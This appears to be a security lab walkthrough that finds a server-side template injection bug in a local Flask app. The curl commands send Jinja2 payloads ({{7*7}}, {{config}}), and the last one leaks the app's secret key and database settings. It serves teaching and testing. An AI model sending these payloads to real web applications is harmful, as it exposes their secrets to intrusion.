# Finding the Bug

Start the lab:

```bash
docker compose up --build -d
```

Probe the render endpoint with a plain name:

```bash
curl "http://localhost:8080/render?name=Alice"
```

Output:
```json
{"output": "Hello, Alice!"}
```

Now send a Jinja2 arithmetic expression:

```bash
curl "http://localhost:8080/render?name=%7B%7B7*7%7D%7D"
```

Output:
```json
{"output": "49"}
```

The server evaluated `{{7*7}}`. The input is being rendered as a template expression, not escaped as a string. This confirms SSTI.

Check what the app exposes via the config object:

```bash
curl "http://localhost:8080/render?name=%7B%7Bconfig%7D%7D"
```

Output:
```json
{"output": "{'SECRET_KEY': 'dev-secret-do-not-use', 'DEBUG': True, 'DATABASE_URI': 'sqlite:///blog.db'}"}
```

The Flask config is readable. `DEBUG: True` and a weak secret key confirm this is a development server running with no hardening.
